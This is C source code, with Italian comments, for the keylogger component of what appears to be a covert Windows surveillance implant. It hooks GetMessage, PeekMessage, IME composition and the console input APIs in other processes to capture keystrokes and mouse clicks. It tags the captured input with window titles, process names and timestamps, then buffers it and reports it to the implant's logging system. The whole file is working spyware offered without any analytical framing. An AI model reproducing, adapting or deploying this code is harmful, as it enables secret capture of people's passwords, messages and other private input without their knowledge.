#define PM_SLEEPTIME 20
#define LOG_BUF_LIMIT 16
#define WM_BUFKEY (WM_USER + 1)
#define WM_SPECIALKEYDOWN (WM_USER + 2)

BOOL bPM_KeyLogStarted = FALSE; // TRUE se l'agent e' attivo

HWND hLastFocus = (HWND)-1; // Ultima finestra con focus
DWORD LogIndex = 0;     // Indice nel buffer di logging
DWORD LastvKey = 0, LastMessage = 0; // Ultimo tasto premuto (per evitare alcune ripetizioni)
char kbuf[256];
char LogBuffer[LOG_BUF_LIMIT + 2];

// --- Hook per la messaggistica --
typedef struct {
	BOOL active;  // La prima variabile deve essere il BOOL di attivazione
} key_log_conf_struct;

typedef struct {
	DWORD msg;
	DWORD lprm;
	DWORD wprm;
} key_params_struct;

typedef struct {
	COMMONDATA;
} GetMessageStruct;
GetMessageStruct GetMessageData;

static BOOL _stdcall PM_GetMessage(DWORD ARG1,
								   DWORD ARG2,
								   DWORD ARG3,
								   DWORD ARG4)
									  
{
	MSG *rec_msg;
	key_log_conf_struct *key_log_conf;
	key_params_struct key_params;
	DWORD *arg_ptr;

	MARK_HOOK

	rec_msg = NULL;

	// Piccolo trucco per convincere il compilatore
	// a usare i parametri di chiamata
	__asm {
		PUSH ESI
		LEA ESI, DWORD PTR [EBP+0x8]
		MOV [arg_ptr], ESI
		POP ESI
	}

	INIT_WRAPPER(GetMessageStruct);

	CALL_ORIGINAL_API(4);

	// Se fallisce o il monitor e' disattivo, ritorna...
	if (ret_code==-1 || !ret_code)
		return (BOOL) ret_code;
	
	// Per il keylogger
	key_log_conf = (key_log_conf_struct *)pData->pHM_IpcCliRead(PM_KEYLOGAGENT);
	if (key_log_conf && key_log_conf->active) {
		rec_msg = (MSG *)arg_ptr[0];
		if (rec_msg->message == WM_KEYDOWN || rec_msg->message == WM_KEYUP ||
			rec_msg->message == WM_SYSKEYDOWN || rec_msg->message == WM_SYSKEYUP ||
			rec_msg->message == WM_CHAR) {
				key_params.msg = rec_msg->message;
				key_params.lprm = rec_msg->lParam;
				key_params.wprm = rec_msg->wParam;
				pData->pHM_IpcCliWrite(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
			}
	}

	// Per il mouse
	key_log_conf = (key_log_conf_struct *)pData->pHM_IpcCliRead(PM_MOUSEAGENT);
	if (key_log_conf && key_log_conf->active) {
		rec_msg = (MSG *)arg_ptr[0];
		if (rec_msg->message == WM_LBUTTONDOWN) {
				key_params.msg = rec_msg->message;
				key_params.lprm = rec_msg->lParam;
				key_params.wprm = rec_msg->wParam;
				pData->pHM_IpcCliWrite(PM_MOUSEAGENT, (BYTE *)&key_params, sizeof(key_params), (DWORD)rec_msg->hwnd, IPC_DEF_PRIORITY);
			}
	}

	return (BOOL) ret_code;
}


static DWORD PM_GetMessage_setup(HMServiceStruct * pData)
{
	GetMessageData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	GetMessageData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	GetMessageData.dwHookLen = 1000;
	
	// sempre zero per la macro....
	return 0;
}


static BOOL _stdcall PM_PeekMessage(DWORD ARG1,
							 	    DWORD ARG2,
								    DWORD ARG3,
								    DWORD ARG4,
									DWORD ARG5)
									  
{
	MSG *rec_msg;
	key_params_struct key_params;
	key_log_conf_struct *key_log_conf;
	DWORD *arg_ptr;

	MARK_HOOK

	rec_msg = NULL;

	// Piccolo trucco per convincere il compilatore
	// a usare i parametri di chiamata
	__asm {
		PUSH ESI
		LEA ESI, DWORD PTR [EBP+0x8]
		MOV [arg_ptr], ESI
		POP ESI
	}

	INIT_WRAPPER(GetMessageStruct);

	CALL_ORIGINAL_API(5);

	// Se fallisce o il monitor e' disattivo, ritorna...
	if (!ret_code)
		return (BOOL) ret_code;
	
	// Se il messaggio e' lasciato in coda non lo considera
	if (!(arg_ptr[4] & PM_REMOVE))
		return (BOOL) ret_code;

	// Per il keylogger
	key_log_conf = (key_log_conf_struct *)pData->pHM_IpcCliRead(PM_KEYLOGAGENT);
	if (key_log_conf && key_log_conf->active) {
		rec_msg = (MSG *)arg_ptr[0];
		if (rec_msg->message == WM_KEYDOWN || rec_msg->message == WM_KEYUP ||
			rec_msg->message == WM_SYSKEYDOWN || rec_msg->message == WM_SYSKEYUP ||
			rec_msg->message == WM_CHAR) {
				key_params.msg = rec_msg->message;
				key_params.lprm = rec_msg->lParam;
				key_params.wprm = rec_msg->wParam;
				pData->pHM_IpcCliWrite(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
		}
	}

	// Per il mouse
	key_log_conf = (key_log_conf_struct *)pData->pHM_IpcCliRead(PM_MOUSEAGENT);
	if (key_log_conf && key_log_conf->active) {
		rec_msg = (MSG *)arg_ptr[0];
		if (rec_msg->message == WM_LBUTTONDOWN) {
				key_params.msg = rec_msg->message;
				key_params.lprm = rec_msg->lParam;
				key_params.wprm = rec_msg->wParam;
				pData->pHM_IpcCliWrite(PM_MOUSEAGENT, (BYTE *)&key_params, sizeof(key_params), (DWORD)rec_msg->hwnd, IPC_DEF_PRIORITY);
			}
	}

	return (BOOL) ret_code;
}


static LONG _stdcall PM_ImmGetCompositionString(DWORD ARG1,
							 	                DWORD ARG2,
								                DWORD ARG3,
								                DWORD ARG4)
									  
{
	key_params_struct key_params;
	key_log_conf_struct *key_log_conf;
	WCHAR *composition_string;
	
	DWORD buf_len;
	DWORD i;
	DWORD *arg_ptr;

	MARK_HOOK

	// Piccolo trucco per convincere il compilatore
	// a usare i parametri di chiamata
	__asm {
		PUSH ESI
		LEA ESI, DWORD PTR [EBP+0x8]
		MOV [arg_ptr], ESI
		POP ESI
	}

	INIT_WRAPPER(GetMessageStruct);

	CALL_ORIGINAL_API(4);

	key_log_conf = (key_log_conf_struct *)pData->pHM_IpcCliRead(PM_KEYLOGAGENT);
	// Se fallisce o il monitor e' disattivo, ritorna...
	if (ret_code==IMM_ERROR_GENERAL || ret_code==IMM_ERROR_NODATA || !key_log_conf || !(key_log_conf->active))
		return (BOOL) ret_code;

	// Consideriamo solo i codici che conosciamo 0 e 2
	if (arg_ptr[1]!=GCS_RESULTSTR || arg_ptr[2]==NULL)
		return (BOOL) ret_code;


	composition_string = (WCHAR *)arg_ptr[2];
	buf_len = ret_code/sizeof(WCHAR);

	// Cicla per tutti i record tornati
	for (i=0; i<buf_len; i++) {
		key_params.msg = WM_CHAR;
		key_params.lprm = 0;
		key_params.wprm = composition_string[i];
		pData->pHM_IpcCliWrite(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
	}

	return (BOOL) ret_code;	
}


static BOOL _stdcall PM_ReadConsoleInput(DWORD ARG1,
							 	         DWORD ARG2,
								         DWORD ARG3,
								         DWORD ARG4)
									  
{
	key_log_conf_struct *key_log_conf;
	key_params_struct key_params;
	INPUT_RECORD *input_record;
	DWORD buf_len;
	DWORD i;
	DWORD *arg_ptr;
	
	MARK_HOOK

	// Piccolo trucco per convincere il compilatore
	// a usare i parametri di chiamata
	__asm {
		PUSH ESI
		LEA ESI, DWORD PTR [EBP+0x8]
		MOV [arg_ptr], ESI
		POP ESI
	}

	INIT_WRAPPER(GetMessageStruct);

	CALL_ORIGINAL_API(4);

	key_log_conf = (key_log_conf_struct *)pData->pHM_IpcCliRead(PM_KEYLOGAGENT);
	// Se fallisce o il monitor e' disattivo, ritorna...
	if (!ret_code || !key_log_conf || !(key_log_conf->active))
		return (BOOL) ret_code;

	input_record = (INPUT_RECORD *)arg_ptr[1];
	buf_len = *((DWORD *)arg_ptr[3]);

	// Cicla per tutti i record tornati
	for (i=0; i<buf_len; i++) {
		// Se non e' un evento tastiera ritorna...
		if (input_record[i].EventType != KEY_EVENT)
			continue;

		// Per ogni record spedisce il tasto relativo
		if (input_record[i].Event.KeyEvent.bKeyDown) {
			key_params.msg = WM_SPECIALKEYDOWN;
			key_params.lprm = (input_record[i].Event.KeyEvent.wVirtualScanCode << 16);
			key_params.wprm = input_record[i].Event.KeyEvent.wVirtualKeyCode;
			pData->pHM_IpcCliWrite(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
		} else {
			key_params.msg = WM_KEYUP;
			key_params.lprm = (input_record[i].Event.KeyEvent.wVirtualScanCode << 16);
			key_params.wprm = input_record[i].Event.KeyEvent.wVirtualKeyCode;
			pData->pHM_IpcCliWrite(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
		}
	}

	return (BOOL) ret_code;	
}


static BOOL _stdcall PM_ReadConsoleInputEx(DWORD ARG1,
							 	           DWORD ARG2,
								           DWORD ARG3,
								           DWORD ARG4,
										   DWORD ARG5)
									  
{
	key_params_struct key_params;
	key_log_conf_struct *key_log_conf;
	INPUT_RECORD *input_record;
	DWORD buf_len;
	DWORD i;
	DWORD *arg_ptr;

	MARK_HOOK

	// Piccolo trucco per convincere il compilatore
	// a usare i parametri di chiamata
	__asm {
		PUSH ESI
		LEA ESI, DWORD PTR [EBP+0x8]
		MOV [arg_ptr], ESI
		POP ESI
	}

	INIT_WRAPPER(GetMessageStruct);

	CALL_ORIGINAL_API(5);

	key_log_conf = (key_log_conf_struct *)pData->pHM_IpcCliRead(PM_KEYLOGAGENT);
	// Se fallisce o il monitor e' disattivo, ritorna...
	if (!ret_code || !key_log_conf || !(key_log_conf->active))
		return (BOOL) ret_code;

	// Consideriamo solo i codici che conosciamo 0 e 2
	if (arg_ptr[4]!=0 && arg_ptr[4]!=2)
		return (BOOL) ret_code;

	input_record = (INPUT_RECORD *)arg_ptr[1];
	buf_len = *((DWORD *)arg_ptr[3]);

	// Cicla per tutti i record tornati
	for (i=0; i<buf_len; i++) {
		// Se non e' un evento tastiera ritorna...
		if (input_record[i].EventType != KEY_EVENT)
			continue;

		// Per ogni record spedisce il tasto relativo
		if (input_record[i].Event.KeyEvent.bKeyDown) {
			key_params.msg = WM_SPECIALKEYDOWN;
			key_params.lprm = (input_record[i].Event.KeyEvent.wVirtualScanCode << 16);
			key_params.wprm = input_record[i].Event.KeyEvent.wVirtualKeyCode;
			pData->pHM_IpcCliWrite(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
		} else {
			key_params.msg = WM_KEYUP;
			key_params.lprm = (input_record[i].Event.KeyEvent.wVirtualScanCode << 16);
			key_params.wprm = input_record[i].Event.KeyEvent.wVirtualKeyCode;
			pData->pHM_IpcCliWrite(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
		}
	}

	return (BOOL) ret_code;	
}


static BOOL _stdcall PM_ReadConsoleA(DWORD ARG1,
							 	     DWORD ARG2,
								     DWORD ARG3,
								     DWORD ARG4,
									 DWORD ARG5)
									  
{
	key_log_conf_struct *key_log_conf;
	key_params_struct key_params;
	DWORD buf_len;
	BYTE *buffer;
	DWORD i;
	DWORD *arg_ptr;

	MARK_HOOK

	// Piccolo trucco per convincere il compilatore
	// a usare i parametri di chiamata
	__asm {
		PUSH ESI
		LEA ESI, DWORD PTR [EBP+0x8]
		MOV [arg_ptr], ESI
		POP ESI
	}

	INIT_WRAPPER(GetMessageStruct);

	CALL_ORIGINAL_API(5);

	key_log_conf = (key_log_conf_struct *)pData->pHM_IpcCliRead(PM_KEYLOGAGENT);
	// Se fallisce o il monitor e' disattivo, ritorna...
	if (!ret_code || !key_log_conf || !(key_log_conf->active))
		return (BOOL) ret_code;

	buffer = (BYTE *)arg_ptr[1];
	buf_len = *((DWORD *)arg_ptr[3]);

	// Invia tutti i caratteri letti
	for (i=0; i<buf_len; i++) {
		key_params.msg = WM_BUFKEY;
		key_params.lprm = buffer[i];
		key_params.wprm = 0;
		pData->pHM_IpcCliWrite(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
	}
}


static BOOL _stdcall PM_ReadConsoleW(DWORD ARG1,
							 	     DWORD ARG2,
								     DWORD ARG3,
								     DWORD ARG4,
									 DWORD ARG5)
									  
{
	key_log_conf_struct *key_log_conf;
	key_params_struct key_params;
	DWORD buf_len;
	WCHAR *buffer;
	DWORD i;
	DWORD *arg_ptr;

	MARK_HOOK

	// Piccolo trucco per convincere il compilatore
	// a usare i parametri di chiamata
	__asm {
		PUSH ESI
		LEA ESI, DWORD PTR [EBP+0x8]
		MOV [arg_ptr], ESI
		POP ESI
	}

	INIT_WRAPPER(GetMessageStruct);

	CALL_ORIGINAL_API(5);

	key_log_conf = (key_log_conf_struct *)pData->pHM_IpcCliRead(PM_KEYLOGAGENT);
	// Se fallisce o il monitor e' disattivo, ritorna...
	if (!ret_code || !key_log_conf || !(key_log_conf->active))
		return (BOOL) ret_code;

	buffer = (WCHAR *)arg_ptr[1];
	buf_len = *((DWORD *)arg_ptr[3]);

	// Invia tutti i caratteri letti
	for (i=0; i<buf_len; i++) {
		key_params.msg = WM_BUFKEY;
		key_params.lprm = buffer[i];
		key_params.wprm = 0;
		pData->pHM_IpcCliWrite(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
	}
}
// ----------------------------------------------------------


// Scrive il keylog parziale su file
void FlushLog()
{
	DWORD local_len = LogIndex;

	LogIndex = 0;
	LOG_ReportLog(PM_KEYLOGAGENT, (BYTE *)LogBuffer, local_len);
	memset(LogBuffer, 0, sizeof(LogBuffer));
	
}

// Inserisce nella coda di scrittura del keylogger
void WriteLog(char *buf, DWORD len)
{
	if (LogIndex + len >= LOG_BUF_LIMIT)
		FlushLog();

	if (len >= LOG_BUF_LIMIT) {
		LOG_ReportLog(PM_KEYLOGAGENT, (BYTE *)buf, len);
		return;
	}

	memcpy(&(LogBuffer[LogIndex]), buf, len);
	LogIndex += len;
}


#define SPECIAL_KEY (vKey == VK_RETURN || vKey == VK_TAB || vKey == VK_CANCEL || vKey == VK_BACK)
#define SPECIAL_ASCII (parser[0]==0x0a || parser[0]==0x0d || parser[0]==0x09 || parser[0]==0x18 || parser[0]==0x08)
void ParseKey(DWORD message, DWORD lParam, DWORD wParam )
{
	DWORD nScan;
	DWORD vKey;
	HWND hFocus;

    if  ((message == WM_SYSKEYDOWN) || (message == WM_KEYDOWN) || 
		 (message == WM_SYSKEYUP) || (message == WM_KEYUP) || 
		 (message == WM_BUFKEY) || (message == WM_CHAR) ||
		 (message == WM_SPECIALKEYDOWN)) {

		DWORD dwCount;
		WCHAR svBuffer[MEDSIZE];
		WCHAR temp_buff[MEDSIZE];

		// Vede se il focus e' cambiato
		hFocus = GetForegroundWindow();
		if(hLastFocus != hFocus) {

			WCHAR svTitle[SMLSIZE];
			WCHAR svProcName[SMLSIZE];
			DWORD dwProcessId = 0;
			DWORD nCount;
			WCHAR *temp_proc_name = NULL;

			// Scrive il titolo della finestra e il timestamp
			memset(svTitle, 0, sizeof(svTitle));
			nCount = HM_SafeGetWindowTextW(hFocus, (LPWSTR)svTitle, SMLSIZE-2);
			if (nCount == 0)
				wsprintfW((LPWSTR)svTitle, L"UNKNOWN");

			// Scrive il nome del processo in foreground
			FNC(GetWindowThreadProcessId)(hFocus, &dwProcessId);
			if (dwProcessId && (temp_proc_name = HM_FindProcW(dwProcessId))) {
				memset(svProcName, 0, sizeof(svProcName));
				FNC(wnsprintfW)((LPWSTR)svProcName, SMLSIZE-2, L"%s", temp_proc_name);
				SAFE_FREE(temp_proc_name);
			} else 
				wsprintfW((LPWSTR)svProcName, L"UNKNOWN");


			// Scrive la nuova intestazione
			bin_buf tolog;
			struct tm tstamp;
			DWORD delimiter = ELEM_DELIMITER;
			GET_TIME(tstamp);
			tolog.add("\x00\x00", 2);
			tolog.add(&tstamp, sizeof(tstamp));
			tolog.add(svProcName, wcslen(svProcName)*2+2);
			tolog.add(svTitle, wcslen(svTitle)*2+2);
			tolog.add(&delimiter, sizeof(DWORD));
			WriteLog((char *)tolog.get_buf(), tolog.get_len());

			hLastFocus = hFocus;
		}

		// Se riceve direttamente un carattere lo scrive...
		// (carattere printabile da console)
		if (message == WM_BUFKEY) {
			// Assumo che siano tutti wchar
			if (lParam != 0)
				WriteLog((char *)&lParam, 2);
			return;
		}

		// Se riceve un WM_CHAR (carattere printabile da win32)
		if (message == WM_CHAR) {
			char *parser = (char *)&wParam;
			// L'invio viene letto come vkey e non come char
			if (parser[1]==0 && SPECIAL_ASCII)
				return;
			if (wParam != 0)
				WriteLog((char *)&wParam, 2);
			return;
		}

		// Se riceve scancode e virtualkey...
		vKey = wParam;
		nScan = lParam;

		// XXX e' SMLSIZE per evitare overflow nella sprintf in temp_buff
		// svBuffer e' sempre NULL terminato se dwCount>0
		dwCount = FNC(GetKeyNameTextW)(nScan, (LPWSTR)svBuffer, SMLSIZE); 
		if (vKey == VK_SPACE)
			dwCount=1;

		// Usato solo per prendere i caratteri da console
		if (message == WM_SPECIALKEYDOWN) {
			if (dwCount == 1){		
				DWORD ch = 0;
				// I tasti CTRL + x li faccio stampare come x
				if (FNC(ToUnicode)(vKey, nScan, (unsigned char *)kbuf, (LPWSTR)&ch, sizeof(ch), 0) > 0)
					if (ch != 0)
						WriteLog((char *)&ch, 2);			
			}
			message = WM_KEYDOWN;
		}

		if(dwCount>1) {
			// Gli special_key vengono ripetuti come i caratteri normali
			// gli altri caratteri particolari vengono notificati solo su pressione e rilascio
			if ( (LastvKey != vKey || LastMessage != message || SPECIAL_KEY) && 
					(!SPECIAL_KEY || ((message == WM_SYSKEYDOWN) || (message == WM_KEYDOWN))) ) {
				
				/*(wsprintfW(temp_buff, L"[%s", svBuffer);
				if (((message == WM_SYSKEYUP) || (message == WM_KEYUP)))
					wcscat(temp_buff,L" REL");
				wcscat(temp_buff, L"]" );*/
				
				// Prendiamo solo una whitelist di tasti e solo sulla pressione
				if ((message == WM_SYSKEYDOWN) || (message == WM_KEYDOWN)) {
					WCHAR symbol = 0;
					switch(vKey) {
						case VK_RETURN:
							symbol = 0x21B5;
							break;
						case VK_F1:
						case VK_F2:
						case VK_F3:
						case VK_F4:
						case VK_F5:
						case VK_F6:
						case VK_F7:
						case VK_F8:
						case VK_F9:
						case VK_F10:
						case VK_F11:
						case VK_F12:
						case VK_F13:
						case VK_F14:
						case VK_F15:
						case VK_F16:
						case VK_F17:
						case VK_F18:
						case VK_F19:
						case VK_F20:
							symbol = 0x2460 + (vKey-VK_F1);
							break;
						case VK_DELETE:
							symbol = 0x2421;
							break;
						case VK_BACK:
							symbol = 0x2408;
							break;
						case VK_TAB:
							symbol = 0x21E5;
							break;
						case VK_ESCAPE:
							symbol = 0x241B;
							break;
						case VK_PRIOR:
							symbol = 0x21D1;
							break;
						case VK_NEXT:
							symbol = 0x21D3;
							break;
						case VK_LEFT:
						case VK_UP:
						case VK_RIGHT:
						case VK_DOWN:
							symbol = 0x2190 + (vKey-VK_LEFT);
							break;
					}
					if (symbol != 0)
						WriteLog((char *)&symbol, 2);
					if(vKey == VK_RETURN) 
						WriteLog((char *)L"\r\n", 4);
				}
			}
			LastvKey = vKey;
			LastMessage = message;
		}
	}
}


DWORD __stdcall PM_KeyLogDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
{
	key_params_struct *key_params;
	key_params = (key_params_struct *)msg;
	ParseKey(key_params->msg, key_params->lprm, key_params->wprm);
	return 1;
}


DWORD __stdcall PM_KeyLogStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;
	key_log_conf_struct key_log_conf;
	
	// Lo fa per prima cosa, anche se e' gia' in quello stato
	// Altrimenti quando gli agenti sono in suspended(per la sync) e ricevo una conf
	// che li mette in stop non verrebbero fermati realmente a causa del check
	// if (bPM_KeyLogStarted == bStartFlag) che considera suspended e stopped uguali.
	// Gli agenti IPC non vengono stoppati quando in suspend (cosi' cmq mettono in coda
	// durante la sync).
	if (bReset)
		AM_IPCAgentStartStop(PM_KEYLOGAGENT, bStartFlag);

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_KeyLogStarted == bStartFlag)
		return 0;

	// Inizializza il logging
	if (bStartFlag && !LOG_InitAgentLog(PM_KEYLOGAGENT))
		return 0;

	bPM_KeyLogStarted = bStartFlag;

	if (bStartFlag) {
		// Inizializza le variabili globali 
		hLastFocus = (HWND)-1; 
		LastvKey = 0, LastMessage = 0;
		LogIndex = 0;
		memset(LogBuffer, 0, sizeof(LogBuffer));
	} else {
		// Se disattivato per la sync, la funzione di dispatch e' gia'
		// ferma a questo punto
		FlushLog();

		// chiude il logging
		LOG_StopAgentLog(PM_KEYLOGAGENT);
	}

	return 1;
}


DWORD __stdcall PM_KeyLogInit(JSONObject elem)
{
	memset(kbuf, 0, sizeof(kbuf));
	return 1;
}


void PM_KeyLogRegister()
{
	AM_MonitorRegister(L"keylog", PM_KEYLOGAGENT, (BYTE *)PM_KeyLogDispatch, (BYTE *)PM_KeyLogStartStop, (BYTE *)PM_KeyLogInit, NULL);
}